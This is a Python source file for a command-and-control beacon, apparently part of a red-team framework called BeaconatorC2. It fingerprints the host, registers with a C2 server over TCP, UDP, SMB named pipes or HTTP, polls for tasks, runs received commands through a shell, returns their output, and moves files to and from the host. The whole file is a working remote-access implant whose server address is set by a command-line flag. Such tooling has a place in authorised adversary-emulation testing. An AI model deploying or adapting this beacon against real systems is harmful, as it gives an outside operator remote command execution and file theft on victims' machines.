#!/usr/bin/env python3
"""
Python Beacon for BeaconatorC2 Testing
Multi-protocol beacon supporting TCP, UDP, SMB, and HTTP communication
Designed for testing receiver implementations across multiple protocols
"""

import argparse
import base64
import hashlib
import os
import platform
import socket
import subprocess
import sys
import threading
import time
import urllib.parse
import urllib.request
import uuid
from pathlib import Path


class PythonBeacon:
    def __init__(self, server_ip="127.0.0.1", server_port=5074, protocol="tcp", pipe_name=None, http_endpoint="/", schema_file="python_beacon.yaml"):
        self.server_ip = server_ip
        self.server_port = server_port
        self.protocol = protocol.lower()
        self.pipe_name = pipe_name or f"BeaconatorC2_{server_port}"
        self.http_endpoint = http_endpoint
        self.schema_file = schema_file
        
        self.agent_id = self.generate_agent_id()
        self.computer_name = platform.node()
        self.check_in_interval = 15  # seconds
        self.is_running = False
        
        print(f"[+] Python Beacon initialized")
        print(f"    Agent ID: {self.agent_id}")
        print(f"    Computer: {self.computer_name}")
        print(f"    Protocol: {self.protocol.upper()}")
        print(f"    Server: {self.server_ip}:{self.server_port}")
        print(f"    Schema: {self.schema_file}")
        if self.protocol == "smb":
            print(f"    Pipe: {self.pipe_name}")
        elif self.protocol == "http":
            print(f"    Endpoint: {self.http_endpoint}")

    def generate_agent_id(self):
        """Generate unique agent ID based on system information"""
        system_info = f"{platform.node()}{platform.system()}"
        
        # Add username (with fallback)
        try:
            username = os.getlogin()
        except:
            try:
                username = os.environ.get('USER', os.environ.get('USERNAME', 'unknown'))
            except:
                username = 'unknown'
        system_info += username
        
        # Add MAC address
        try:
            mac = ':'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff) 
                          for elements in range(0,2*6,2)][::-1])
            system_info += mac
        except:
            pass
            
        # Add script path
        system_info += os.path.abspath(__file__)
        
        # Generate hash
        return hashlib.md5(system_info.encode()).hexdigest()[:8]

    def log(self, message):
        """Simple logging function"""
        timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
        print(f"[{timestamp}] {message}")

    def send_tcp(self, message, expect_response=True, is_file_transfer=False):
        """Send message via TCP"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(30)
            sock.connect((self.server_ip, self.server_port))
            
            sock.send(message.encode('utf-8'))
            
            if expect_response:
                if is_file_transfer:
                    return sock  # Return socket for file operations
                else:
                    response = sock.recv(4096).decode('utf-8').strip()
                    sock.close()
                    return response
            else:
                sock.close()
                return "OK"
                
        except Exception as e:
            self.log(f"TCP Error: {e}")
            return f"ERROR: {e}"

    def send_udp(self, message, expect_response=True):
        """Send message via UDP"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.settimeout(10)
            
            # Send UDP datagram
            bytes_sent = sock.sendto(message.encode('utf-8'), (self.server_ip, self.server_port))
            self.log(f"UDP: Sent {bytes_sent} bytes to {self.server_ip}:{self.server_port}")
            
            if expect_response:
                try:
                    response, addr = sock.recvfrom(4096)
                    sock.close()
                    response_str = response.decode('utf-8').strip()
                    self.log(f"UDP: Received response from {addr}: {response_str}")
                    return response_str
                except socket.timeout:
                    sock.close()
                    self.log("UDP: No response received (timeout)")
                    return "ERROR: No response (timeout)"
            else:
                sock.close()
                return "OK"
                
        except Exception as e:
            self.log(f"UDP Error: {e}")
            return f"ERROR: {e}"

    def send_smb(self, message, expect_response=True, is_file_transfer=False):
        """Send message via SMB named pipe"""
        try:
            if os.name == 'nt':  # Windows
                pipe_path = f"\\\\.\\pipe\\{self.pipe_name}"
                
                try:
                    # Try to use win32pipe for proper named pipe handling
                    import win32file
                    import win32pipe
                    import pywintypes
                    
                    # Wait for the named pipe to be available
                    win32pipe.WaitNamedPipe(pipe_path, 5000)  # 5 second timeout
                    
                    # Open the named pipe
                    pipe_handle = win32file.CreateFile(
                        pipe_path,
                        win32file.GENERIC_READ | win32file.GENERIC_WRITE,
                        0,
                        None,
                        win32file.OPEN_EXISTING,
                        0,
                        None
                    )
                    
                    # Write message
                    self.log(f"SMB: Writing message to pipe: {message}")
                    win32file.WriteFile(pipe_handle, message.encode('utf-8'))
                    
                    if expect_response:
                        if is_file_transfer:
                            return pipe_handle  # Return handle for file operations
                        else:
                            # Read response with timeout handling
                            self.log("SMB: Waiting for response...")
                            try:
                                result, response_data = win32file.ReadFile(pipe_handle, 4096)
                                response = response_data.decode('utf-8').strip()
                                self.log(f"SMB: Received response: {response}")
                                win32file.CloseHandle(pipe_handle)
                                return response
                            except Exception as read_error:
                                self.log(f"SMB: Read error: {read_error}")
                                win32file.CloseHandle(pipe_handle)
                                return f"ERROR: Read failed: {read_error}"
                    else:
                        win32file.CloseHandle(pipe_handle)
                        return "OK"
                        
                except ImportError:
                    # Fallback to basic file operations if pywin32 not available
                    self.log("pywin32 not available, using basic file operations")
                    with open(pipe_path, 'r+b') as pipe:
                        pipe.write(message.encode('utf-8'))
                        pipe.flush()
                        
                        if expect_response:
                            response = pipe.read(4096).decode('utf-8').strip()
                            return response
                        else:
                            return "OK"
                    
            else:  # Unix-like (FIFO) - Back to FIFO with better error handling
                pipe_path = f"/tmp/beaconator_c2_pipes/{self.pipe_name}"
                
                if not os.path.exists(pipe_path):
                    self.log(f"SMB pipe not found: {pipe_path}")
                    return "ERROR: Pipe not found"
                
                self.log(f"SMB: Using FIFO: {pipe_path}")
                try:
                    # Write message to FIFO
                    with open(pipe_path, 'w') as pipe:
                        pipe.write(message)
                        pipe.flush()
                        self.log(f"SMB: Wrote to FIFO: {message}")
                    
                    if expect_response:
                        self.log("SMB: Waiting for FIFO response...")
                        
                        # Give receiver time to process
                        time.sleep(0.1)
                        
                        # Read response from FIFO
                        try:
                            with open(pipe_path, 'r') as pipe:
                                response = pipe.read().strip()
                                if response:
                                    self.log(f"SMB: Received FIFO response: {response}")
                                    return response
                                else:
                                    self.log("SMB: Empty FIFO response")
                                    return "ERROR: Empty response"
                        except Exception as read_error:
                            self.log(f"SMB: FIFO read error: {read_error}")
                            return f"ERROR: FIFO read failed: {read_error}"
                    else:
                        return "OK"
                        
                except Exception as fifo_error:
                    self.log(f"SMB: FIFO error: {fifo_error}")
                    return f"ERROR: FIFO operation failed: {fifo_error}"
                
        except Exception as e:
            self.log(f"SMB Error: {e}")
            # Provide more specific error information
            if "No such file or directory" in str(e):
                return f"ERROR: Named pipe '{self.pipe_name}' not found. Make sure SMB receiver is running."
            return f"ERROR: {e}"

    def send_http(self, message, expect_response=True, is_file_transfer=False):
        """Send message via HTTP"""
        try:
            url = f"http://{self.server_ip}:{self.server_port}{self.http_endpoint}"
            
            # Prepare request data
            data = message.encode('utf-8')
            
            # Create request
            req = urllib.request.Request(url, data=data, method='POST')
            req.add_header('Content-Type', 'application/octet-stream')
            req.add_header('User-Agent', f'BeaconatorC2-Beacon/{self.agent_id}')
            
            self.log(f"HTTP: Sending POST to {url}")
            
            if expect_response:
                if is_file_transfer:
                    # For file transfers, return the response object
                    response = urllib.request.urlopen(req, timeout=30)
                    return response
                else:
                    # Regular command response
                    with urllib.request.urlopen(req, timeout=30) as response:
                        response_data = response.read().decode('utf-8').strip()
                        self.log(f"HTTP: Received response: {response_data}")
                        return response_data
            else:
                # Fire and forget
                with urllib.request.urlopen(req, timeout=10) as response:
                    pass
                return "OK"
                
        except urllib.error.HTTPError as e:
            error_msg = f"HTTP Error {e.code}: {e.reason}"
            self.log(error_msg)
            return f"ERROR: {error_msg}"
        except urllib.error.URLError as e:
            error_msg = f"URL Error: {e.reason}"
            self.log(error_msg)
            return f"ERROR: {error_msg}"
        except Exception as e:
            self.log(f"HTTP Error: {e}")
            return f"ERROR: {e}"

    def send_message(self, message, expect_response=True, is_file_transfer=False):
        """Send message using configured protocol"""
        if self.protocol == "tcp":
            return self.send_tcp(message, expect_response, is_file_transfer)
        elif self.protocol == "udp":
            if is_file_transfer:
                return "ERROR: File transfer not supported over UDP"
            return self.send_udp(message, expect_response)
        elif self.protocol == "smb":
            return self.send_smb(message, expect_response, is_file_transfer)
        elif self.protocol == "http":
            return self.send_http(message, expect_response, is_file_transfer)
        else:
            return f"ERROR: Unknown protocol {self.protocol}"

    def register(self):
        """Register beacon with server"""
        message = f"register|{self.agent_id}|{self.computer_name}|{self.schema_file}"
        self.log(f"Attempting registration with message: {message}")
        response = self.send_message(message)
        self.log(f"Registration response: {response}")
        return response

    def request_action(self):
        """Request pending action from server"""
        message = f"request_action|{self.agent_id}"
        self.log(f"Requesting action: {message}")
        response = self.send_message(message)
        self.log(f"Action response: {response}")
        return response

    def send_checkin(self):
        """Send checkin heartbeat"""
        message = f"checkin|{self.agent_id}"
        response = self.send_message(message, expect_response=False)
        return response

    def execute_command(self, command):
        """Execute system command"""
        try:
            self.log(f"Executing: {command}")
            
            # Execute command
            result = subprocess.run(
                command, 
                shell=True, 
                capture_output=True, 
                text=True, 
                timeout=300
            )
            
            # Combine stdout and stderr
            output = ""
            if result.stdout:
                output += f"STDOUT:\n{result.stdout}\n"
            if result.stderr:
                output += f"STDERR:\n{result.stderr}\n"
            if not output:
                output = f"Command executed (exit code: {result.returncode})"
                
            return output.strip()
            
        except subprocess.TimeoutExpired:
            return "ERROR: Command timeout (300s)"
        except Exception as e:
            return f"ERROR: {e}"

    def send_command_output(self, output):
        """Send command output to server"""
        message = f"command_output|{self.agent_id}|{output}"
        response = self.send_message(message, expect_response=False)
        return response

    def download_file(self, filename):
        """Download file from server"""
        if self.protocol == "udp":
            return "ERROR: File transfer not supported over UDP"
            
        try:
            message = f"to_beacon|{filename}"
            
            if self.protocol == "tcp":
                sock = self.send_message(message, expect_response=True, is_file_transfer=True)
                if isinstance(sock, str) and sock.startswith("ERROR"):
                    return sock
                    
                # Receive file data
                file_data = b""
                while True:
                    chunk = sock.recv(8192)
                    if not chunk:
                        break
                    file_data += chunk
                sock.close()
                
            elif self.protocol == "smb":
                # SMB file transfer (simplified)
                pipe_handle = self.send_message(message, expect_response=True, is_file_transfer=True)
                if isinstance(pipe_handle, str) and pipe_handle.startswith("ERROR"):
                    return pipe_handle
                    
                # Read file data from pipe
                file_data = b""
                if os.name == 'nt':
                    while True:
                        try:
                            chunk = os.read(pipe_handle, 8192)
                            if not chunk:
                                break
                            file_data += chunk
                        except:
                            break
                    os.close(pipe_handle)
                else:
                    # Unix FIFO - simplified read
                    with open(f"/tmp/beaconator_c2_pipes/{self.pipe_name}", 'rb') as pipe:
                        file_data = pipe.read()
                        
            elif self.protocol == "http":
                # HTTP file download
                response = self.send_message(message, expect_response=True, is_file_transfer=True)
                if isinstance(response, str) and response.startswith("ERROR"):
                    return response
                    
                # Read file data from HTTP response
                file_data = response.read()
                response.close()
            
            # Save file
            downloads_dir = Path.home() / "Downloads" / "beacon_downloads"
            downloads_dir.mkdir(exist_ok=True)
            
            file_path = downloads_dir / filename
            with open(file_path, 'wb') as f:
                f.write(file_data)
                
            return f"File downloaded: {file_path} ({len(file_data)} bytes)"
            
        except Exception as e:
            return f"ERROR downloading file: {e}"

    def upload_file(self, filename):
        """Upload file to server"""
        if self.protocol == "udp":
            return "ERROR: File transfer not supported over UDP"
            
        try:
            # Check if file exists
            file_path = Path(filename)
            if not file_path.exists():
                return f"ERROR: File not found: {filename}"
                
            message = f"from_beacon|{file_path.name}"
            
            if self.protocol == "tcp":
                sock = self.send_message(message, expect_response=True, is_file_transfer=True)
                if isinstance(sock, str) and sock.startswith("ERROR"):
                    return sock
                    
                # Wait for READY response
                ready_response = sock.recv(1024).decode('utf-8').strip()
                if ready_response != "READY":
                    sock.close()
                    return f"ERROR: Server not ready: {ready_response}"
                
                # Send file data
                with open(file_path, 'rb') as f:
                    while True:
                        chunk = f.read(8192)
                        if not chunk:
                            break
                        sock.send(chunk)
                
                # Get response
                response = sock.recv(1024).decode('utf-8').strip()
                sock.close()
                return response
                
            elif self.protocol == "smb":
                # SMB file upload (simplified)
                pipe_handle = self.send_message(message, expect_response=True, is_file_transfer=True)
                if isinstance(pipe_handle, str) and pipe_handle.startswith("ERROR"):
                    return pipe_handle
                    
                # Send file data through pipe
                with open(file_path, 'rb') as f:
                    file_data = f.read()
                    
                if os.name == 'nt':
                    os.write(pipe_handle, file_data)
                    response = os.read(pipe_handle, 1024).decode('utf-8').strip()
                    os.close(pipe_handle)
                else:
                    # Unix FIFO - simplified write
                    with open(f"/tmp/beaconator_c2_pipes/{self.pipe_name}", 'wb') as pipe:
                        pipe.write(file_data)
                    response = "SUCCESS"  # Simplified for Unix
                    
                return response
                
            elif self.protocol == "http":
                # HTTP file upload
                url = f"http://{self.server_ip}:{self.server_port}{self.http_endpoint}"
                
                # Read file data
                with open(file_path, 'rb') as f:
                    file_data = f.read()
                
                # Create upload request with file data in body
                upload_message = f"{message}".encode('utf-8') + b"|" + file_data
                req = urllib.request.Request(url, data=upload_message, method='POST')
                req.add_header('Content-Type', 'application/octet-stream')
                req.add_header('User-Agent', f'BeaconatorC2-Beacon/{self.agent_id}')
                
                # Send upload request
                with urllib.request.urlopen(req, timeout=60) as response:
                    response_data = response.read().decode('utf-8').strip()
                    return response_data
                
        except Exception as e:
            return f"ERROR uploading file: {e}"

    def process_command(self, command_data):
        """Process command from server"""
        try:
            # Check for standard "no command" responses from server
            no_command_responses = [
                "", 
                "No commands queued", 
                "no_pending_commands",
                "No pending commands"
            ]
            
            if not command_data or command_data in no_command_responses:
                return None
                
            self.log(f"Processing: {command_data}")
            
            # Handle different command types
            if command_data.startswith("execute_command|"):
                _, cmd = command_data.split("|", 1)
                output = self.execute_command(cmd)
                self.send_command_output(output)
            elif "|" not in command_data:
                # Simple command execution
                output = self.execute_command(command_data)
                self.send_command_output(output)
                
            else:
                self.log(f"Unknown command format: {command_data}")
                
        except Exception as e:
            self.log(f"Error processing command: {e}")
            self.send_command_output(f"ERROR: {e}")


    def run(self):
        """Main beacon loop"""
        self.log("Starting beacon...")
        
        # Initial registration
        self.register()
        self.is_running = True
        
        try:
            while self.is_running:
                try:
                    # Request action from server with timeout handling
                    self.log("Starting beacon cycle...")
                    action = self.request_action()
                    
                    if action and not action.startswith("ERROR"):
                        self.process_command(action)
                    elif action and action.startswith("ERROR"):
                        self.log(f"Communication error: {action}")
                        self.log("Will retry in next cycle...")
                    
                    # Wait before next cycle
                    self.log(f"Waiting {self.check_in_interval} seconds before next cycle...")
                    time.sleep(self.check_in_interval)
                    
                except KeyboardInterrupt:
                    self.log("Beacon interrupted by user")
                    break
                except Exception as e:
                    self.log(f"Beacon error: {e}")
                    time.sleep(5)  # Wait before retry
                    
        except Exception as e:
            self.log(f"Fatal beacon error: {e}")
        finally:
            self.is_running = False
            self.log("Beacon stopped")


def main():
    parser = argparse.ArgumentParser(description="Python Beacon for BeaconatorC2 Testing")
    parser.add_argument("--server", default="127.0.0.1", help="Server IP address")
    parser.add_argument("--port", type=int, default=5074, help="Server port")
    parser.add_argument("--protocol", choices=["tcp", "udp", "smb", "http"], default="tcp", 
                       help="Communication protocol")
    parser.add_argument("--pipe", help="SMB pipe name (for SMB protocol)")
    parser.add_argument("--endpoint", default="/", help="HTTP endpoint path (for HTTP protocol)")
    parser.add_argument("--interval", type=int, default=15, help="Check-in interval in seconds")
    parser.add_argument("--schema", default="python_beacon.yaml", help="Schema file for auto-assignment")
    
    args = parser.parse_args()
    
    # Create and run beacon
    beacon = PythonBeacon(
        server_ip=args.server,
        server_port=args.port,
        protocol=args.protocol,
        pipe_name=args.pipe,
        http_endpoint=args.endpoint,
        schema_file=args.schema
    )
    
    beacon.check_in_interval = args.interval
    
    try:
        beacon.run()
    except KeyboardInterrupt:
        print("\n[!] Beacon terminated by user")
    except Exception as e:
        print(f"[!] Beacon failed: {e}")


if __name__ == "__main__":
    main()